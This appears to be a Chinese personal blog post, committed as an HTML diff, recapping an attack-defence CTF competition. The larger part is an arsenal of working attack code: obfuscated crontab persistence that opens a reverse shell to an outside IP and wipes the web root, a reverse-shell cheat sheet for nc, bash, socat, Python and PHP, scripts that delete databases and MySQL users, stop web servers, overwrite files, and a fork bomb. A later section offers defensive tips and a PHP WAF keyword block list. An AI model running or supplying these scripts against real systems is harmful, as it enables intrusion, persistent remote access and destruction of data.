@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+
+<!--
+  portfolYOU Jekyll theme by Youssef Raafat
+  Free for personal and commercial use under the MIT license
+  https://github.com/YoussefRaafatNasry/portfolYOU
+-->
+
+<html lang="en" class="h-100">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content=""一只猫～"">
+
+  <title>dyf's blog</title>
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">
+
+  <!-- Bootstrap CSS CDN -->
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+
+  <!-- Animate CSS CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css" type="text/css"/>
+  
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/assets/css/style.css" type="text/css">
+
+  <!-- Mathjax for latex -->
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+
+  <!-- comment system -->
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+
+</head>
+
+
+<body class="d-flex flex-column h-100">
+
+  <main class="flex-shrink-0 container mt-5">
+  <nav class="navbar navbar-expand-lg navbar-light">
+
+  <a class="navbar-brand" href="/"><h5><b>dyf's blog</b></h5></a>
+
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+    <div class="navbar-nav ml-auto"><a class="nav-item nav-link " href="/projects/">Projects</a>
+
+      <a class="nav-item nav-link active" href="/blog/">Blog</a>
+
+      <a class="nav-item nav-link " href="/link/">Link</a>
+
+      <a class="nav-item nav-link " href="/about/">About</a>
+
+      
+
+    </div>
+  </div>
+
+</nav>
+  <div class="col-lg-10 mx-auto mt-5 post">
+  <h1><b>蓝帽杯awd总结</b></h1>
+
+<p class="post-metadata text-muted">
+  23 August 2019 -
+  <b>8 mins read time</b>
+
+  <br>Tags:
+  
+  <a class="text-decoration-none no-underline" href="/blog/tags#awd">
+    <span class="tag badge badge-pill text-primary border border-primary">awd</span>
+  </a>
+  </p>
+
+<p>  最近沉迷于学习verilog以及计算机底层的相关知识,已经很久没有搞安全了.突然有机会打一场向往已久的AWD令我很是期待.终于我和朴淳 国峰 兴致冲冲的来到了国家会议中心,好生气派.</p>
+
+<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/blue_hat1.jpg?raw=true" alt="blue_hat1" /></p>
+
+<p>  下午比赛刚开始,所有服务器直接宕机…不得不说奇安信这个做的不好.过了很久之后修好了,然后我们直接就被打懵了.一直疯狂掉分,直到挂上waf才稍有好转.总结一下学到的一点经验:</p>
+
+<h3 id="关于进攻">关于进攻</h3>
+
+<hr />
+
+<p>  反正这一次一下攻击都没有打,全程做防御.因为根本来不及代码审计,赛后问了一下对面的大佬怎么打的,他们说是thinkphp的cve,他们也就找到一个洞,然后就进了前十…可见赛前资料的准备有多么重要.另外就后门而言,见到了好几个特别骚的木马,当然不死马是最基础的,其实不死马能起作用主要是因为目录权限配置的有问题,主目录直接给了777肯定会被日啊.普通目录尽量别给写的权限.</p>
+
+<p>  还有一种马是base64加密马,然后添加crontab来写一句话木马.妈的这个是真的难受,我只能写shell一直删,还有就是一定要搅屎.我们有个nginx服务直接被删掉了,我都没发现有这个目录…然后服务一down开始疯狂掉分,我只好去偷别人的静态网页,诶,心里苦.</p>
+
+<p>  关于搅屎,我痛定思痛,写了好几个搅屎棍:</p>
+
+<ul>
+  <li>无限复制:</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+    <span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="nb">ignore_user_abort</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nx">randstr</span><span class="p">()</span><span class="o">.</span><span class="s1">'.php'</span><span class="p">,</span><span class="nx">file_get_content</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
+        <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"http://127.0.0.1/"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>连名都是随机的,疯狂占资源,算是ddos吧</p>
+</blockquote>
+
+<ul>
+  <li>改数据库密码:</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">update</span> <span class="n">mysql</span><span class="p">.</span><span class="k">user</span> <span class="k">set</span> <span class="n">authentication_string</span><span class="o">=</span><span class="n">PASSWORD</span><span class="p">(</span><span class="s1">'p4rr0t'</span><span class="p">);</span><span class="o">#</span> <span class="err">修改所有用户密码</span>
+<span class="n">flush</span> <span class="k">privileges</span><span class="p">;</span>
+<span class="k">UPDATE</span> <span class="n">mysql</span><span class="p">.</span><span class="k">user</span> <span class="k">SET</span> <span class="k">User</span><span class="o">=</span><span class="s1">'aaaaaaaaaaaa'</span> <span class="k">WHERE</span> <span class="k">user</span><span class="o">=</span><span class="s1">'root'</span><span class="p">;</span> 
+<span class="n">flush</span> <span class="k">privileges</span><span class="p">;</span>
+<span class="k">delete</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="k">user</span> <span class="p">;</span><span class="o">#</span><span class="err">删除所有用户</span>
+<span class="n">flush</span> <span class="k">privileges</span><span class="p">;</span>
+</code></pre></div></div>
+<p>  当时比赛的时候没想起来…</p>
+
+<ul>
+  <li>各种crontab骚东西:</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">import</span> <span class="nn">base64</span>
+
+
+<span class="k">def</span> <span class="nf">crontab_reverse</span><span class="p">(</span><span class="n">reverse_ip</span><span class="p">,</span> <span class="n">reverse_port</span><span class="p">):</span>
+    <span class="n">crontab_path</span> <span class="o">=</span> <span class="s">"/tmp"</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s">'bash -i &gt;&amp; /dev/tcp/</span><span class="si">%</span><span class="s">s/</span><span class="si">%</span><span class="s">d 0&gt;&amp;1'</span> <span class="o">%</span> <span class="p">(</span><span class="n">reverse_ip</span><span class="p">,</span> <span class="n">reverse_port</span><span class="p">)</span>
+    <span class="n">crontab_cmd</span> <span class="o">=</span> <span class="s">"* * * * * bash -c '</span><span class="si">%</span><span class="s">s'</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">cmd</span>
+    <span class="n">encode_crontab_cmd</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">crontab_cmd</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s">"/bin/echo "</span> <span class="o">+</span> <span class="n">encode_crontab_cmd</span> <span class="o">+</span> <span class="s">" | /usr/bin/base64 -d | /bin/cat &gt;&gt; "</span> <span class="o">+</span> <span class="n">crontab_path</span> <span class="o">+</span> <span class="s">"/tmp_rev.conf"</span> <span class="o">+</span> <span class="s">" ; "</span> <span class="o">+</span> <span class="s">"/usr/bin/crontab "</span> <span class="o">+</span> <span class="n">crontab_path</span> <span class="o">+</span> <span class="s">"/tmp.conf"</span>
+    <span class="k">return</span> <span class="n">cmd</span>
+
+
+<span class="k">def</span> <span class="nf">crontab_rm</span><span class="p">(</span><span class="n">rm_paths</span><span class="o">=</span><span class="s">'/var/www/html/'</span><span class="p">):</span>
+    <span class="n">crontab_path</span> <span class="o">=</span> <span class="s">"/tmp"</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s">'/bin/rm -rf </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">rm_paths</span>
+    <span class="n">crontab_cmd</span> <span class="o">=</span> <span class="s">"* * * * * </span><span class="si">%</span><span class="s">s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">cmd</span>
+    <span class="n">encode_crontab_cmd</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">crontab_cmd</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s">"/bin/echo "</span> <span class="o">+</span> <span class="n">encode_crontab_cmd</span> <span class="o">+</span> <span class="s">" | /usr/bin/base64 -d | /bin/cat &gt;&gt; "</span> <span class="o">+</span> <span class="n">crontab_path</span> <span class="o">+</span> <span class="s">"/tmp_rm.conf"</span> <span class="o">+</span> <span class="s">" ; "</span> <span class="o">+</span> <span class="s">"/usr/bin/crontab "</span> <span class="o">+</span> <span class="n">crontab_path</span> <span class="o">+</span> <span class="s">"/tmp.conf"</span>
+    <span class="k">return</span> <span class="n">cmd</span>
+
+
+<span class="k">def</span> <span class="nf">crontab_flag_submit</span><span class="p">(</span><span class="n">flag_server</span><span class="p">,</span> <span class="n">flag_port</span><span class="p">,</span> <span class="n">flag_api</span><span class="p">,</span> <span class="n">flag_token</span><span class="p">,</span>
+                        <span class="n">flag_host</span><span class="p">):</span>
+    <span class="n">crontab_path</span> <span class="o">=</span> <span class="s">'/tmp'</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s">'/usr/bin/curl "http://</span><span class="si">%</span><span class="s">s:</span><span class="si">%</span><span class="s">s/</span><span class="si">%</span><span class="s">s" -d "token=</span><span class="si">%</span><span class="s">s&amp;flag=$(curl </span><span class="si">%</span><span class="s">s)" '</span> <span class="o">%</span> <span class="p">(</span>
+        <span class="n">flag_server</span><span class="p">,</span> <span class="n">flag_port</span><span class="p">,</span> <span class="n">flag_api</span><span class="p">,</span> <span class="n">flag_token</span><span class="p">,</span> <span class="n">flag_host</span><span class="p">)</span>
+    <span class="n">crontab_cmd</span> <span class="o">=</span> <span class="s">"* * * * * </span><span class="si">%</span><span class="s">s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">cmd</span>
+    <span class="n">encode_crontab_cmd</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">crontab_cmd</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s">"/bin/echo "</span> <span class="o">+</span> <span class="n">encode_crontab_cmd</span> <span class="o">+</span> <span class="s">" | /usr/bin/base64 -d | /bin/cat &gt;&gt; "</span> <span class="o">+</span> <span class="n">crontab_path</span> <span class="o">+</span> <span class="s">"/tmp_submit.conf"</span> <span class="o">+</span> <span class="s">" ; "</span> <span class="o">+</span> <span class="s">"/usr/bin/crontab "</span> <span class="o">+</span> <span class="n">crontab_path</span> <span class="o">+</span> <span class="s">"/tmp.conf"</span>
+    <span class="k">return</span> <span class="n">cmd</span>
+
+
+<span class="c1">#  cmd = crontab_flag_submit(flag_server='0.0.0.0',
+</span>                          <span class="c1">#  flag_port='8888',
+</span>                          <span class="c1">#  flag_api='submit',
+</span>                          <span class="c1">#  flag_token='bcbe3365e6ac95ea2c0343a2395834dd',
+</span>                          <span class="c1">#  flag_host='http://192.168.100.1/Getkey')
+#  print(cmd)
+</span>
+<span class="n">cmd</span> <span class="o">=</span> <span class="n">crontab_reverse</span><span class="p">(</span><span class="s">'202.204.62.222'</span><span class="p">,</span><span class="mi">6666</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+</code></pre></div></div>
+<p>  这个应该算是最牛逼的马了,waf基本挡不住,杀也杀不死.</p>
+
+<ul>
+  <li>疯狂日apache2和nigix:</li>
+</ul>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env sh</span>
+<span class="k">while</span> <span class="o">[[</span> 1 <span class="o">]]</span>
+<span class="k">do
+    </span>service apache2 stop
+    service nginx stop
+<span class="k">done</span> &amp;
+</code></pre></div></div>
+
+<p>  杀不死基本凉凉,服务down扣分贼严重,</p>
+
+<ul>
+  <li>删东西:</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+    <span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="nb">ignore_user_abort</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="nb">unlink</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+    <span class="k">function</span> <span class="nf">getfiles</span><span class="p">(</span><span class="nv">$path</span><span class="p">){</span>
+        <span class="k">foreach</span><span class="p">(</span><span class="nb">glob</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$afile</span><span class="p">){</span>
+            <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$afile</span><span class="p">))</span>
+                <span class="nx">getfiles</span><span class="p">(</span><span class="nv">$afile</span><span class="o">.</span><span class="s1">'/*.php'</span><span class="p">);</span>
+            <span class="k">else</span>
+                <span class="o">@</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$afile</span><span class="p">,</span><span class="s2">"#Anything#"</span><span class="p">);</span>
+                <span class="c1">//unlink($afile);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
+        <span class="nx">getfiles</span><span class="p">(</span><span class="nx">__DIR__</span><span class="p">);</span>
+        <span class="nb">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span>
+
+<span class="cp">&lt;?php</span>
+    <span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="nb">ignore_user_abort</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="nb">array_map</span><span class="p">(</span><span class="s1">'unlink'</span><span class="p">,</span> <span class="nb">glob</span><span class="p">(</span><span class="s2">"some/dir/*.php"</span><span class="p">));</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>  不说了,心里痛…qaq</p>
+
+<ul>
+  <li>删库跑路:</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">import</span> <span class="nn">base64</span>
+<span class="k">def</span> <span class="nf">rm_db</span><span class="p">(</span><span class="n">db_user</span><span class="p">,</span><span class="n">my_db_passwd</span><span class="p">):</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s">"/usr/bin/mysql -h localhost -u</span><span class="si">%</span><span class="s">s </span><span class="si">%</span><span class="s">s -e '"</span><span class="o">%</span><span class="p">(</span><span class="n">db_user</span><span class="p">,</span><span class="n">my_db_passwd</span><span class="p">)</span>
+    <span class="n">db_name</span> <span class="o">=</span> <span class="p">[</span><span class="s">'performance_schema'</span><span class="p">,</span><span class="s">'mysql'</span><span class="p">,</span><span class="s">'flag'</span><span class="p">]</span>
+    <span class="k">for</span> <span class="n">db</span> <span class="ow">in</span> <span class="n">db_name</span><span class="p">:</span>
+        <span class="n">cmd</span> <span class="o">+=</span> <span class="s">"drop database </span><span class="si">%</span><span class="s">s;"</span><span class="o">%</span><span class="n">db</span>
+    <span class="n">cmd</span> <span class="o">+=</span> <span class="s">"'"</span>
+    <span class="k">return</span> <span class="n">cmd</span>  
+</code></pre></div></div>
+
+<p>  这个应该也是杀伤力极强,基本不会有人备份库子…</p>
+
+<ul>
+  <li>fork_bomb</li>
+</ul>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+/bin/echo <span class="s1">'.() { .|.&amp; } &amp;&amp; .'</span> <span class="o">&gt;</span> /tmp/aaa<span class="p">;</span>/bin/bash /tmp/aaa<span class="p">;</span>
+</code></pre></div></div>
+
+<p>  这东西不及时发现就凉了,磁盘一会就爆了</p>
+
+<ul>
+  <li>反弹后门技巧</li>
+</ul>
+
+<blockquote>
+  <p>shell</p>
+</blockquote>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-e</span> /bin/bash 1.3.3.7 4444
+bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;/dev/tcp/1.3.3.7/4444 0&gt;&amp;1'</span>
+zsh <span class="nt">-c</span> <span class="s1">'zmodload zsh/net/tcp &amp;&amp; ztcp 1.3.3.7 4444 &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY'</span>
+socat <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:1.3.3.7:4444  
+</code></pre></div></div>
+
+<blockquote>
+  <p>python</p>
+</blockquote>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_REAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>php</p>
+</blockquote>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">'$sock=fsockopen("your_ip","4444");exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>windows</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">nc.exe</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">/bin/bash</span><span class="w"> </span><span class="nx">1.3.3.7</span><span class="w"> </span><span class="nx">4444</span><span class="w">
+</span></code></pre></div></div>
+
+<p>  看到这么多罪恶的脚本心里好受了许多</p>
+
+<blockquote>
+  <p>一定要记得流量混淆,瞎鸡儿发一下垃圾包假装连一句话混淆视听</p>
+</blockquote>
+
+<h3 id="关于防御">关于防御</h3>
+
+<hr />
+
+<p>  防御是真的难,但也基本就一下几点:</p>
+
+<ol>
+  <li>日志
+    <ul>
+      <li>/var/log/apache2/access.log</li>
+      <li>/var/log/apache2/error.log</li>
+      <li>/var/log/nginx/access.log</li>
+      <li>/var/log/nginx/error.log</li>
+    </ul>
+  </li>
+  <li>要快速弄清楚服务的目录,做好备份!!!!!!!
+    <ul>
+      <li>去看/etc/apache2/ports.conf和/etc/apache2/sites-available/000-default.conf,快速找到目录和对应端口</li>
+      <li>去/etc/nginx/ 基本差不多</li>
+      <li>不做备份哭鸡鸡</li>
+    </ul>
+  </li>
+  <li>
+    <p>配置目录权限,尽量不要给777</p>
+  </li>
+  <li>挂waf,但是框架挂waf有些困难,我得再研究一下挂在哪里比较合适,盲猜得挂路由…
+    <ul>
+      <li>这是我魔改的蜜罐,过滤了crontab和base64,我真是怕了…</li>
+      <li>需要注意的是,最好建一个log目录然后给777,最好不要直接把log写在当前目录下</li>
+    </ul>
+  </li>
+</ol>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'LOG_FILENAME'</span><span class="p">,</span> <span class="s1">'log.txt'</span><span class="p">);</span>
+<span class="k">function</span> <span class="nf">waf</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'getallheaders'</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">function</span> <span class="nf">getallheaders</span><span class="p">()</span> <span class="p">{</span>
+            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_SERVER</span> <span class="k">as</span> <span class="nv">$name</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="s1">'HTTP_'</span><span class="p">)</span> <span class="nv">$headers</span><span class="p">[</span><span class="nb">str_replace</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span> <span class="s1">'-'</span><span class="p">,</span> <span class="nb">ucwords</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span><span class="s1">'_'</span><span class="p">,</span> <span class="s1">' '</span><span class="p">,</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="mi">5</span><span class="p">)))))</span> <span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="k">return</span> <span class="nv">$headers</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nv">$get</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">;</span>
+    <span class="nv">$post</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">;</span>
+    <span class="nv">$cookie</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">;</span>
+    <span class="nv">$header</span> <span class="o">=</span> <span class="nb">getallheaders</span><span class="p">();</span>
+    <span class="nv">$files</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">;</span>
+    <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">];</span>
+    <span class="nv">$method</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">];</span>
+    <span class="nv">$filepath</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"SCRIPT_NAME"</span><span class="p">];</span>
+    <span class="c1">//rewirte shell which uploaded by others, you can do more</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_FILES</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$files</span><span class="p">[</span><span class="nv">$key</span><span class="p">][</span><span class="s1">'content'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="nv">$key</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">]);</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="nv">$key</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="s2">"virink"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nb">unset</span><span class="p">(</span><span class="nv">$header</span><span class="p">[</span><span class="s1">'Accept'</span><span class="p">]);</span> <span class="c1">//fix a bug</span>
+    <span class="nv">$input</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+        <span class="s2">"Get"</span> <span class="o">=&gt;</span> <span class="nv">$get</span><span class="p">,</span>
+        <span class="s2">"Post"</span> <span class="o">=&gt;</span> <span class="nv">$post</span><span class="p">,</span>
+        <span class="s2">"Cookie"</span> <span class="o">=&gt;</span> <span class="nv">$cookie</span><span class="p">,</span>
+        <span class="s2">"File"</span> <span class="o">=&gt;</span> <span class="nv">$files</span><span class="p">,</span>
+        <span class="s2">"Header"</span> <span class="o">=&gt;</span> <span class="nv">$header</span>
+    <span class="p">);</span>
+    <span class="c1">//deal with</span>
+    <span class="nv">$pattern</span> <span class="o">=</span> <span class="s2">"select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex"</span><span class="p">;</span>
+    <span class="nv">$pattern</span><span class="o">.=</span> <span class="s2">"|file_put_contents|fwrite|curl|system|eval|assert|crontab|base64"</span><span class="p">;</span>
+    <span class="nv">$pattern</span><span class="o">.=</span> <span class="s2">"|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"</span><span class="p">;</span>
+    <span class="nv">$pattern</span><span class="o">.=</span> <span class="s2">"|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec"</span><span class="p">;</span>
+    <span class="nv">$vpattern</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"|"</span><span class="p">,</span> <span class="nv">$pattern</span><span class="p">);</span>
+    <span class="nv">$bool</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$input</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$vpattern</span> <span class="k">as</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$v</span> <span class="k">as</span> <span class="nv">$kk</span> <span class="o">=&gt;</span> <span class="nv">$vv</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/</span><span class="nv">$value</span><span class="s2">/i"</span><span class="p">,</span> <span class="nv">$vv</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="nv">$bool</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+                    <span class="nx">logging</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$bool</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$bool</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="nf">logging</span><span class="p">(</span><span class="nv">$var</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nx">LOG_FILENAME</span><span class="p">,</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span> <span class="o">.</span> <span class="nb">time</span><span class="p">()</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span> <span class="o">.</span> <span class="nb">print_r</span><span class="p">(</span><span class="nv">$var</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span> <span class="p">,</span> <span class="nx">FILE_APPEND</span><span class="p">);</span>
+    <span class="c1">// die() or unset($_GET) or unset($_POST) or unset($_COOKIE);</span>
+<span class="p">}</span>
+<span class="nx">waf</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<ol>
+  <li>
+    <p>写shell监视文件变化</p>
+  </li>
+  <li>
+    <p>不死马删除</p>
+    <ul>
+      <li>杀死www-data的进程,然后新建一个同名的文件</li>
+      <li>crontab马…只能写shell了,或者用php脚本删除crontab</li>
+    </ul>
+  </li>
+</ol>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env sh</span>
+<span class="nx">ps</span> <span class="o">-</span><span class="nx">aux</span><span class="o">|</span><span class="nx">grep</span> <span class="s1">'www-data'</span><span class="o">|</span><span class="nx">awk</span> <span class="s1">'{print $2}'</span><span class="o">|</span><span class="nx">xargs</span> <span class="nx">kill</span> <span class="o">-</span><span class="mi">9</span>
+</code></pre></div></div>
+
+<h3 id="总结">总结</h3>
+
+<hr />
+
+<p>  其实awd不在于漏洞多,在于cve的利用和搅屎,有一段时间我们没有掉分结果排名十分靠前,说明能进攻的队基本没几个,所以在准备不周的情况下做好防御就行了.
+  然后就是赛后一定要多尝试,要去熟悉主流框架的cve比如thinkphp laravel之类的.真正比赛的时候根本来不及仔细看哪些是后门,也没时间代码审计,全靠手感和经验.</p>
+
+<h4 id="广告">广告</h4>
+
+<hr />
+
+<p>  这是我写的awd攻击框架(虽然没用上…),能批量shell执行,很舒服.欢迎体验<a href="https://github.com/Explainaur/P4rr0t_shell">parrot_shell</a></p>
+
+<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/blue_hat2.jpg?raw=true" alt="parrot" /></p>
+
+<p>  最后来一张队友合照,嘿嘿404 forever</p>
+
+<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/blue_hat3.jpg?raw=true" alt="404" /></p>
+
+
+
+<div id="vcomments"></div>
+<script>
+  new Valine({
+    el: '#vcomments',
+    appId: '9PQd0VOdLBtIrk7DuYhbXgo1-gzGzoHsz',
+    appKey: '0tooNX9XI400l94QiuBP0lXm',
+
+    avatar:'robohash',
+    visitor: true, // 阅读量统计
+    enableQQ: true
+  })
+</script>
